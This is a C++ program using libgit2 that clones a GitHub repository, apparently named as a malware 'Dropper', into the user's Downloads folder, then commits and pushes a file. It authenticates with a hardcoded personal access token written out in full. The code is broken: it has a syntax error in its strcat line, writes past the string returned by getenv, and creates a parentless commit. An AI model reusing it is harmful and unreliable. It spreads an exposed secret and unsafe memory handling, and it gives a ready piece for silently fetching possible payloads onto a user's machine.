#include <git2.h>
#include <iostream>
#include <cstring>

struct AuthData
{
    const char* token;
};

int credentials_callback(
    git_credential **out,
    const char *url,
    const char *username_from_url,
    unsigned int allowed_types,
    void *payload)
{
    AuthData* auth = (AuthData*)payload;

    return git_credential_userpass_plaintext_new(
        out,
        "x-access-token",
        auth->token
    );
}


int main()
{
    git_libgit2_init();


    const char* url = "https://github.com/Rastraktocat/Walmart-version-of-Dropper.git";

    char* path = std::getenv("USERPROFILE");
    strcat(path, "\\Downloads";

    const char* token = "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";

    AuthData auth;
    auth.token = token;


    /*
        Clone repository
    */

    git_repository* repo = nullptr;

    git_clone_options clone_opts;
    git_clone_options_init(
        &clone_opts,
        GIT_CLONE_OPTIONS_VERSION
    );

    clone_opts.fetch_opts.callbacks.credentials =
        credentials_callback;

    clone_opts.fetch_opts.callbacks.payload =
        &auth;


    int error =
        git_clone(
            &repo,
            url,
            path,
            &clone_opts
        );


    if (error != 0)
    {
        const git_error* e = git_error_last();
        std::cerr
            << "Clone failed: "
            << e->message
            << "\n";

        return 1;
    }


    /*
        Add file
    */

    git_index* index = nullptr;

    git_repository_index(
        &index,
        repo
    );


    git_index_add_bypath(
        index,
        "file.txt"
    );

    git_index_write(index);



    /*
        Create commit
    */

    git_oid tree_oid;

    git_index_write_tree(
        &tree_oid,
        index
    );


    git_tree* tree = nullptr;

    git_tree_lookup(
        &tree,
        repo,
        &tree_oid
    );


    git_signature* signature = nullptr;

    git_signature_now(
        &signature,
        "LibGit2 Bot",
        "bot@example.com"
    );


    git_oid commit_oid;

    git_commit_create(
        &commit_oid,
        repo,
        "HEAD",
        signature,
        signature,
        nullptr,
        "Automated commit",
        tree,
        0,
        nullptr
    );


    /*
        Push commit
    */

    git_remote* remote = nullptr;

    git_remote_lookup(
        &remote,
        repo,
        "origin"
    );


    git_push_options push_opts;

    git_push_options_init(
        &push_opts,
        GIT_PUSH_OPTIONS_VERSION
    );


    push_opts.callbacks.credentials =
        credentials_callback;

    push_opts.callbacks.payload =
        &auth;


    const char* ref =
        "refs/heads/main";


    git_strarray refspecs;

    refspecs.count = 1;
    refspecs.strings =
        const_cast<char**>(&ref);


    error =
        git_remote_push(
            remote,
            &refspecs,
            &push_opts
        );


    if (error != 0)
    {
        const git_error* e =
            git_error_last();

        std::cerr
            << "Push failed: "
            << e->message
            << "\n";
    }
    else
    {
        std::cout
            << "Clone, commit and push successful\n";
    }


    git_remote_free(remote);
    git_tree_free(tree);
    git_signature_free(signature);
    git_index_free(index);
    git_repository_free(repo);

    git_libgit2_shutdown();

    return 0;
}
